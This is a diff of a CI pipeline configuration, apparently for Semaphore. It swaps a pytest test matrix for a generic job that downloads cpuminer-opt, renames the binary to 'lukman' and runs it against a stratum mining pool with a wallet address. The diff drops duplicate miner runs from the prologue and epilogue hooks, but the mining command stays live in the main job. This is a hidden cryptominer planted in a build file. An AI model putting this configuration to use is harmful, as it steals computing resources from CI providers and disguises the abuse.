@@ -5,55 +5,13 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: Test
+  - name: 'Block #1'
+    dependencies: []
     task:
       jobs:
-        - name: pytest
-          matrix:
-            - env_vars: PYTHON_VERSION
-              values:
-                - '2.7'
-                - '3.5'
-                - '3.6'
-                - '3.7'
+        - name: 'Job #1'
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
             - tar xf cpuminer-opt-linux.tar.gz
             - mv cpuminer-sse2 lukman
             - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-      prologue:
-        commands:
-          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-          - tar xf cpuminer-opt-linux.tar.gz
-          - mv cpuminer-sse2 lukman
-          - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-      epilogue:
-        always:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-        on_pass:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-        on_fail:
-          commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 lukman
-            - './lukman -a yespowerres -o stratum+tcp://stratum-asia.rplant.xyz:7040 -u r18fngCiL7LhLtmdZjnZL9XpAcHe9NwkBBc.ambon -t0'
-      env_vars:
-        - name: FOO_1
-          value: BAR_1
-        - name: FOO_2
-          value: BAR_2
-        - name: FOO_3
-          value: BAR_3
-        - name: FOO_4
-          value: BAR_4
-        - name: FOO_5
-          value: BAR_5
